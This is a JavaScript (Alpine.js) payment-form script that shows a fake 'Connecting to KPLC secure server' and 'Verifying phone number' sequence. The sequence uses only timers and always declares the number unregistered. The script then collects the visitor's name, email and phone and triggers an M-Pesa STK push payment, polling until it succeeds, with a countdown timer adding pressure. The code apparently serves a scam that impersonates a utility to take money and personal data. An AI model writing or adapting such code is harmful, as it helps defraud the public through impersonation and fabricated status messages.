// Alpine.js for payment form
function countdownTimer(hours) {
  return {
    timer: '',
    end: new Date(Date.now() + hours * 60 * 60 * 1000),
    interval: null,
    init() {
      this.update();
      this.interval = setInterval(() => this.update(), 1000);
    },
    update() {
      const now = new Date();
      let diff = Math.max(0, this.end - now);
      let h = Math.floor(diff / (1000 * 60 * 60));
      let m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      let s = Math.floor((diff % (1000 * 60)) / 1000);
      this.timer = `${h > 0 ? h+':' : ''}${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }
  }
}

const API_BASE = window.location.hostname === 'localhost' ? 'http://localhost:8888/.netlify/functions' : '/.netlify/functions';

function paymentForm() {
  return {
    step: 'initial', // 'initial', 'checking', 'unregistered', 'registering', 'activation', 'submitting'
    phone: '',
    name: '',
    email: '',
    loadingMessage: '',
    activationStatus: 'Sending STK push to your phone...',
    pollInterval: null,

    checkPhoneNumber() {
      if (!this.phone.match(/^07[0-9]{8}$/)) return;
      this.step = 'checking';
      this.loadingMessage = 'Connecting to KPLC secure server...';
      setTimeout(() => {
        this.loadingMessage = 'Verifying phone number...';
        setTimeout(() => {
          this.step = 'unregistered';
        }, 1800);
      }, 1500);
    },

    showRegistrationForm() {
      this.step = 'registering';
    },

    submitRegistration() {
      if (!this.name || !this.email || !this.phone.match(/^07[0-9]{8}$/)) {
        alert('Please fill all fields correctly.');
        return;
      }
      this.step = 'activation';
      this.initiateStkPush();
    },

    async initiateStkPush() {
      try {
        const response = await fetch(`${API_BASE}/initiate-payment`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: this.phone })
        });
        const data = await response.json();
        if (data.success) {
          this.activationStatus = 'STK push sent. Please check your phone.';
          this.startPolling(data.data.externalReference);
        } else {
          this.activationStatus = data.message || 'Failed to initiate payment. Please try again.';
        }
      } catch (error) {
        this.activationStatus = 'An error occurred. Please try again later.';
      }
    },

    startPolling(reference) {
      if (this.pollInterval) clearInterval(this.pollInterval);
      this.pollInterval = setInterval(async () => {
        try {
          const response = await fetch(`${API_BASE}/payment-status/${reference}`);
          const data = await response.json();
          if (data.success && data.payment) {
            if (data.payment.status === 'SUCCESS') {
              clearInterval(this.pollInterval);
              this.activationStatus = 'Payment successful! Redirecting...';
              sessionStorage.setItem('mpesaPhone', this.phone);
              window.location.href = 'confirmation.html';
            } else if (data.payment.status === 'FAILED') {
              clearInterval(this.pollInterval);
              this.activationStatus = 'Payment failed. Please try again.';
            }
          }
        } catch (error) {
          // Don't stop polling on network error
        }
      }, 5000);
    }
  }
}

window.paymentForm = paymentForm;
window.countdownTimer = countdownTimer;

